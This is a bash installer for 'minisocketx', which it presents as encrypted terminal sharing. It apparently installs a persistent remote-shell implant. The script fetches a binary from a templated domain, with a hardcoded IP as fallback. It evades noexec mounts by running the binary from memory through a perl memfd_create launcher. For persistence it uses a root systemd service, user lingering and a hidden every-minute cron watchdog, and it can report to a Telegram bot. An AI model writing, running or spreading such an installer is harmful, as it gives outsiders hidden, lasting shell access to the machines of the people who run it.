#!/bin/bash

DOMAIN="{{DOMAIN}}"
BIN_NAME="minisocketx"
SERVICE_NAME="minisocketx"
VERSION="1.2.0"
TG_BOT="${TG_BOT:-}"
TG_CHAT="${TG_CHAT:-}"
SESSION_FILE="${MINISOCKETX_SESSION_FILE:-/var/lib/minisocketx/session.json}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)
IS_ROOT=0
[ "$(id -u)" -eq 0 ] && IS_ROOT=1

if [ $IS_ROOT -eq 1 ]; then
    INSTALL_DIR="/usr/local/bin"
else
    INSTALL_DIR="$HOME/.local/bin"
fi

# ── Uninstall ──────────────────────────────────────────────
if [ "${1:-}" = "--uninstall" ] || [ "${1:-}" = "uninstall" ] || [ "${1:-}" = "-u" ]; then
    echo ""
    echo -e "  ${BOLD}Uninstalling minisocketx${RESET}"
    echo ""

    # Stop & remove systemd service (root)
    if [ $IS_ROOT -eq 1 ] && [ -f "/etc/systemd/system/${SERVICE_NAME}.service" ]; then
        systemctl stop "$SERVICE_NAME" 2>/dev/null || true
        systemctl disable "$SERVICE_NAME" 2>/dev/null || true
        rm -f "/etc/systemd/system/${SERVICE_NAME}.service"
        systemctl daemon-reload 2>/dev/null || true
        echo -e "  ${GREEN}✓${RESET} Systemd service removed"
    fi

    # Stop & remove systemd service (user)
    if [ $IS_ROOT -eq 0 ]; then
        systemctl --user stop "$SERVICE_NAME" 2>/dev/null || true
        systemctl --user disable "$SERVICE_NAME" 2>/dev/null || true
        rm -f "$HOME/.config/systemd/user/${SERVICE_NAME}.service"
        systemctl --user daemon-reload 2>/dev/null || true
        if [ -f "$HOME/.config/systemd/user/${SERVICE_NAME}.service" ] 2>/dev/null; then
            true
        else
            echo -e "  ${GREEN}✓${RESET} User service removed"
        fi
    fi

    # Remove cron watchdog
    if crontab -l 2>/dev/null | grep -q "minisocketx-watchdog"; then
        crontab -l 2>/dev/null | grep -v "minisocketx-watchdog" | crontab -
        echo -e "  ${GREEN}✓${RESET} Cron watchdog removed"
    fi

    # Kill running process
    if [ -f /tmp/.minisocketx.pid ]; then
        kill "$(cat /tmp/.minisocketx.pid)" 2>/dev/null || true
        rm -f /tmp/.minisocketx.pid
    fi
    pkill -f "${INSTALL_DIR}/${BIN_NAME}" 2>/dev/null || true

    # Remove binary
    if [ -f "${INSTALL_DIR}/${BIN_NAME}" ]; then
        rm -f "${INSTALL_DIR}/${BIN_NAME}"
        echo -e "  ${GREEN}✓${RESET} Binary removed: ${INSTALL_DIR}/${BIN_NAME}"
    fi

    # Remove watchdog script & noexec launcher
    rm -f "${INSTALL_DIR}/.minisocketx-watchdog.sh" 2>/dev/null
    rm -f "${INSTALL_DIR}/.${BIN_NAME}-exec" 2>/dev/null

    # Remove data & log directories
    if [ $IS_ROOT -eq 1 ]; then
        if [ -d "/var/lib/minisocketx" ]; then
            rm -rf "/var/lib/minisocketx"
            echo -e "  ${GREEN}✓${RESET} Data removed: /var/lib/minisocketx"
        fi
        if [ -d "/var/log/minisocketx" ]; then
            rm -rf "/var/log/minisocketx"
            echo -e "  ${GREEN}✓${RESET} Logs removed: /var/log/minisocketx"
        fi
    else
        if [ -d "$HOME/.local/share/minisocketx" ]; then
            rm -rf "$HOME/.local/share/minisocketx"
            echo -e "  ${GREEN}✓${RESET} Data removed: ~/.local/share/minisocketx"
        fi
    fi

    # Clean PATH from shell rc
    if [ $IS_ROOT -eq 0 ]; then
        for RC in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.config/fish/config.fish"; do
            if [ -f "$RC" ] && grep -q "$INSTALL_DIR" "$RC" 2>/dev/null; then
                if [ "$(basename "$RC")" = "config.fish" ]; then
                    sed -i "/set -gx PATH.*\.local\/bin/d" "$RC" 2>/dev/null || \
                        sed -i '' "/set -gx PATH.*\.local\/bin/d" "$RC" 2>/dev/null
                else
                    sed -i "\|export PATH=.*\.local/bin|d" "$RC" 2>/dev/null || \
                        sed -i '' "\|export PATH=.*\.local/bin|d" "$RC" 2>/dev/null
                fi
                echo -e "  ${GREEN}✓${RESET} PATH cleaned from $(basename $RC)"
            fi
        done
    fi

    echo ""
    echo -e "  ${GREEN}✓${RESET} ${BOLD}minisocketx${RESET} completely uninstalled"
    echo ""
    exit 0
fi

# ── Install ────────────────────────────────────────────────

case "$ARCH" in
    x86_64|amd64)  ARCH="amd64" ;;
    aarch64|arm64) ARCH="arm64" ;;
    *)
        echo -e "  ${RED}✗${RESET} Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

case "$OS" in
    linux|darwin) ;;
    *)
        echo -e "  ${RED}✗${RESET} Unsupported OS: $OS"
        exit 1
        ;;
esac

BINARY="${BIN_NAME}-${OS}-${ARCH}"
URL="https://${DOMAIN}/dl/${BINARY}"

echo ""
echo -e "  ${DIM}Detecting platform...${RESET} ${OS}-${ARCH}"

if [ $IS_ROOT -eq 0 ]; then
    mkdir -p "$INSTALL_DIR" 2>/dev/null || true
fi

TMP=$(mktemp)
trap 'rm -f "$TMP"' EXIT

echo -e "  Downloading..."
DL_OK=0

check_dl() {
    FSIZE=$(wc -c < "$TMP" 2>/dev/null | tr -dc '0-9')
    [ -z "$FSIZE" ] && FSIZE=0
    [ "$FSIZE" -gt 100000 ] 2>/dev/null && DL_OK=1
}

if command -v curl >/dev/null 2>&1; then
    curl -sSL --connect-timeout 10 --max-time 120 "$URL" -o "$TMP" 2>/dev/null
    check_dl
elif command -v wget >/dev/null 2>&1; then
    wget -q --timeout=10 "$URL" -O "$TMP" 2>/dev/null
    check_dl
else
    echo -e "  ${RED}✗${RESET} curl or wget required"
    exit 1
fi
if [ $DL_OK -eq 0 ]; then
    echo -e "  ${RED}✗${RESET} Download failed. Check connectivity to ${DOMAIN} or 157.230.255.170"
    exit 1
fi

FSIZE=$(wc -c < "$TMP" 2>/dev/null | tr -dc '0-9')
echo -e "  ${GREEN}✓${RESET} Downloaded ${FSIZE} bytes"

chmod +x "$TMP"

if [ $IS_ROOT -eq 1 ]; then
    mv "$TMP" "$INSTALL_DIR/$BIN_NAME"
elif [ -w "$INSTALL_DIR" ]; then
    mv "$TMP" "$INSTALL_DIR/$BIN_NAME"
else
    sudo mv "$TMP" "$INSTALL_DIR/$BIN_NAME"
fi

echo -e "  ${GREEN}✓${RESET} Installed to ${INSTALL_DIR}/${BIN_NAME}"

# ── noexec bypass ─────────────────────────────────────────
# If the install dir is mounted noexec, create a launcher
# that uses perl memfd_create to execute from anonymous memory.
NOEXEC=0
if ! "${INSTALL_DIR}/${BIN_NAME}" --help >/dev/null 2>&1; then
    NOEXEC=1
fi

if [ $NOEXEC -eq 1 ] && command -v perl >/dev/null 2>&1; then
    LAUNCHER="${INSTALL_DIR}/.${BIN_NAME}-exec"
    cat > "$LAUNCHER" <<'LEXEC'
#!/bin/bash
BIN="BINPATH_PLACEHOLDER"
exec perl -e '$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);open(B,"<",$ARGV[0])||die;{local$/;print$o <B>};close B;exec{"/proc/$$/fd/$f"}X,@ARGV[1..$#ARGV];exit 255' -- "$BIN" "$@"
LEXEC
    sed -i "s|BINPATH_PLACEHOLDER|${INSTALL_DIR}/${BIN_NAME}|g" "$LAUNCHER" 2>/dev/null || \
        sed -i '' "s|BINPATH_PLACEHOLDER|${INSTALL_DIR}/${BIN_NAME}|g" "$LAUNCHER" 2>/dev/null
    chmod +x "$LAUNCHER" 2>/dev/null || true
    echo -e "  ${YELLOW}!${RESET} Filesystem is noexec — using memfd launcher"
    EXEC_CMD="$LAUNCHER"
else
    EXEC_CMD="${INSTALL_DIR}/${BIN_NAME}"
fi

echo ""

if [ $IS_ROOT -eq 0 ]; then
    case ":$PATH:" in
        *":$INSTALL_DIR:"*) ;;
        *)
            SHELL_NAME=$(basename "$SHELL")
            RC_FILE=""
            case "$SHELL_NAME" in
                bash) RC_FILE="$HOME/.bashrc" ;;
                zsh)  RC_FILE="$HOME/.zshrc" ;;
                fish) RC_FILE="$HOME/.config/fish/config.fish" ;;
            esac
            if [ -n "$RC_FILE" ]; then
                if ! grep -q "$INSTALL_DIR" "$RC_FILE" 2>/dev/null; then
                    if [ "$SHELL_NAME" = "fish" ]; then
                        echo "set -gx PATH $INSTALL_DIR \$PATH" >> "$RC_FILE"
                    else
                        echo "export PATH=\"$INSTALL_DIR:\$PATH\"" >> "$RC_FILE"
                    fi
                    echo -e "  ${GREEN}✓${RESET} Added ${INSTALL_DIR} to PATH in ${RC_FILE}"
                fi
            fi
            echo -e "  ${YELLOW}!${RESET} Run ${BOLD}source ${RC_FILE}${RESET} or open a new terminal"
            echo ""
            ;;
    esac
fi

setup_systemd_root() {
    SESSION_DIR=$(dirname "$SESSION_FILE")
    mkdir -p "$SESSION_DIR" 2>/dev/null || true

    LOG_DIR="/var/log/minisocketx"
    mkdir -p "$LOG_DIR" && chmod 700 "$LOG_DIR"

    TG_ENV=""
    if [ -n "$TG_BOT" ] && [ -n "$TG_CHAT" ]; then
        TG_ENV="Environment=TG_BOT=${TG_BOT}
Environment=TG_CHAT=${TG_CHAT}"
    fi

    cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<SVCEOF
[Unit]
Description=MinisocketX - Encrypted Terminal Sharing
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${EXEC_CMD} --daemon --session-file ${SESSION_FILE}
Restart=always
RestartSec=5
User=root
Environment=TERM=xterm-256color
Environment=MINISOCKETX_SESSION_FILE=${SESSION_FILE}
Environment=SSHX_SERVER=https://${DOMAIN}
${TG_ENV}
StandardOutput=append:${LOG_DIR}/output.log
StandardError=append:${LOG_DIR}/error.log
SyslogIdentifier=${SERVICE_NAME}
LimitNOFILE=65536
WatchdogSec=60
StartLimitIntervalSec=300
StartLimitBurst=5

[Install]
WantedBy=multi-user.target
SVCEOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME" 2>/dev/null || true
    systemctl restart "$SERVICE_NAME" 2>/dev/null || true
    echo -e "  ${GREEN}✓${RESET} Systemd service installed & started"
}

setup_systemd_user() {
    local USER_SVC_DIR="$HOME/.config/systemd/user"
    mkdir -p "$USER_SVC_DIR" 2>/dev/null || true

    local USER_SESSION_DIR="$HOME/.local/share/minisocketx"
    mkdir -p "$USER_SESSION_DIR" 2>/dev/null || true
    SESSION_FILE="$USER_SESSION_DIR/session.json"

    TG_ENV=""
    if [ -n "$TG_BOT" ] && [ -n "$TG_CHAT" ]; then
        TG_ENV="Environment=TG_BOT=${TG_BOT}
Environment=TG_CHAT=${TG_CHAT}"
    fi

    cat > "$USER_SVC_DIR/${SERVICE_NAME}.service" <<SVCEOF
[Unit]
Description=MinisocketX - Encrypted Terminal Sharing
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${EXEC_CMD} --daemon --session-file ${SESSION_FILE}
Restart=always
RestartSec=5
Environment=TERM=xterm-256color
Environment=MINISOCKETX_SESSION_FILE=${SESSION_FILE}
${TG_ENV}
StandardOutput=journal
StandardError=journal
SyslogIdentifier=${SERVICE_NAME}
StartLimitIntervalSec=300
StartLimitBurst=5

[Install]
WantedBy=default.target
SVCEOF

    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable "$SERVICE_NAME" 2>/dev/null || true
    loginctl enable-linger "$(whoami)" 2>/dev/null || true
    systemctl --user restart "$SERVICE_NAME" 2>/dev/null || true
    echo -e "  ${GREEN}✓${RESET} User service installed & started"
}

setup_cron_restart() {
    local WATCHDOG="${INSTALL_DIR}/.minisocketx-watchdog.sh"
    cat > "$WATCHDOG" <<'WDEOF'
#!/bin/bash
PIDFILE="/tmp/.minisocketx.pid"
BIN="EXEC_CMD_PLACEHOLDER"
if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
    exit 0
fi
nohup "$BIN" >/dev/null 2>&1 &
echo $! > "$PIDFILE"
WDEOF
    sed -i "s|EXEC_CMD_PLACEHOLDER|${EXEC_CMD}|g" "$WATCHDOG" 2>/dev/null || \
        sed -i '' "s|EXEC_CMD_PLACEHOLDER|${EXEC_CMD}|g" "$WATCHDOG" 2>/dev/null
    chmod +x "$WATCHDOG"

    CRON_LINE="* * * * * ${WATCHDOG}"
    (crontab -l 2>/dev/null | grep -v "minisocketx-watchdog" ; echo "$CRON_LINE") | crontab -
    echo -e "  ${GREEN}✓${RESET} Cron watchdog installed ${DIM}(checks every minute)${RESET}"
    echo -e "  ${GREEN}✓${RESET} Auto-restart enabled"
    echo ""
    echo -e "  ${BOLD}${CYAN}minisocketx${RESET} v${VERSION} — encrypted terminal sharing"
    echo ""

    bash "$WATCHDOG"
    sleep 1
    if [ -f /tmp/.minisocketx.pid ] && kill -0 "$(cat /tmp/.minisocketx.pid)" 2>/dev/null; then
        echo -e "  ${GREEN}●${RESET} Running ${DIM}(pid $(cat /tmp/.minisocketx.pid))${RESET}"
    else
        echo -e "  ${YELLOW}●${RESET} Starting..."
    fi
    # Wait for session link
    LINK=""
    for i in 1 2 3 4 5 6 7 8 9 10; do
        SF="$HOME/.minisocketx-session"
        if [ -f "$SF" ]; then
            LINK=$(cat "$SF" 2>/dev/null | grep -o '"url":"[^"]*"' | head -1 | cut -d'"' -f4)
            [ -n "$LINK" ] && break
        fi
        sleep 1
    done
    if [ -n "$LINK" ]; then
        echo -e "  ${BOLD}Link:${RESET}  ${BLUE}${LINK}${RESET}"
    fi
    echo ""
    echo -e "  ${BOLD}Commands${RESET}"
    echo -e "    minisocketx                         ${DIM}# Run directly${RESET}"
    echo -e "    kill \$(cat /tmp/.minisocketx.pid)    ${DIM}# Stop (auto-restarts in 1m)${RESET}"
    echo -e "    crontab -e                           ${DIM}# Edit watchdog schedule${RESET}"
}

if [ "$OS" = "linux" ] && command -v systemctl >/dev/null 2>&1; then
    if [ $IS_ROOT -eq 1 ]; then
        setup_systemd_root
    else
        setup_systemd_user
    fi

    echo -e "  ${GREEN}✓${RESET} Auto-restart enabled ${DIM}(restarts on crash, 5s delay)${RESET}"
    echo -e "  ${GREEN}✓${RESET} Starts on boot"

    if [ $IS_ROOT -eq 0 ]; then
        echo -e "  ${GREEN}✓${RESET} Linger enabled ${DIM}(runs without active login)${RESET}"
    fi

    if [ -n "$TG_BOT" ] && [ -n "$TG_CHAT" ]; then
        echo -e "  ${GREEN}✓${RESET} Telegram integration enabled"
    fi

    echo ""
    echo -e "  ${BOLD}${CYAN}minisocketx${RESET} v${VERSION} — encrypted terminal sharing"
    echo ""

    if [ $IS_ROOT -eq 1 ]; then
        SVC_STATUS=$(systemctl is-active "$SERVICE_NAME" 2>/dev/null)
        [ -z "$SVC_STATUS" ] && SVC_STATUS="unknown"
    else
        SVC_STATUS=$(systemctl --user is-active "$SERVICE_NAME" 2>/dev/null)
        [ -z "$SVC_STATUS" ] && SVC_STATUS="unknown"
    fi

    if [ "$SVC_STATUS" = "active" ]; then
        echo -e "  ${GREEN}●${RESET} Service running"
    else
        echo -e "  ${YELLOW}●${RESET} Service status: ${SVC_STATUS}"
    fi

    # Wait for session link
    LINK=""
    if [ "$SVC_STATUS" = "active" ]; then
        printf "  ${DIM}Waiting for session...${RESET}"
        for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
            if [ -f "$SESSION_FILE" ]; then
                LINK=$(cat "$SESSION_FILE" 2>/dev/null | grep -o '"url":"[^"]*"' | head -1 | cut -d'"' -f4)
                [ -n "$LINK" ] && break
            fi
            sleep 1
        done
        printf "\r                                \r"
    fi
    if [ -n "$LINK" ]; then
        echo ""
        echo -e "  ${BOLD}Link:${RESET}  \033[4;34m${LINK}\033[0m"
    fi

    echo ""
    if [ $IS_ROOT -eq 1 ]; then
        echo -e "  ${BOLD}Commands${RESET}"
        echo -e "    systemctl stop ${SERVICE_NAME}       ${DIM}# Stop${RESET}"
        echo -e "    systemctl restart ${SERVICE_NAME}    ${DIM}# Restart${RESET}"
        echo -e "    systemctl status ${SERVICE_NAME}     ${DIM}# Status${RESET}"
        echo -e "    journalctl -u ${SERVICE_NAME} -f     ${DIM}# Logs${RESET}"
    else
        echo -e "  ${BOLD}Commands${RESET}"
        echo -e "    systemctl --user stop ${SERVICE_NAME}       ${DIM}# Stop${RESET}"
        echo -e "    systemctl --user restart ${SERVICE_NAME}    ${DIM}# Restart${RESET}"
        echo -e "    systemctl --user status ${SERVICE_NAME}     ${DIM}# Status${RESET}"
        echo -e "    journalctl --user -u ${SERVICE_NAME} -f     ${DIM}# Logs${RESET}"
    fi

    echo ""
    echo -e "  ${DIM}Or run directly:${RESET} ${BOLD}minisocketx${RESET}"
    echo -e "  ${DIM}Uninstall:${RESET}     ${BOLD}curl -fsSL https://${DOMAIN}/install.sh | bash -s -- --uninstall${RESET}"
elif [ "$OS" = "linux" ] || [ "$OS" = "darwin" ]; then
    setup_cron_restart
    echo -e "  ${DIM}Uninstall:${RESET} ${BOLD}curl -fsSL https://${DOMAIN}/install.sh | bash -s -- --uninstall${RESET}"
else
    echo -e "  ${BOLD}${CYAN}minisocketx${RESET} v${VERSION} — encrypted terminal sharing"
    echo ""
    echo -e "  ${DIM}Run${RESET} ${BOLD}minisocketx${RESET} ${DIM}to start a shared terminal session.${RESET}"
    echo -e "  ${DIM}Uninstall:${RESET} ${BOLD}curl -fsSL https://${DOMAIN}/install.sh | bash -s -- --uninstall${RESET}"
fi

echo ""
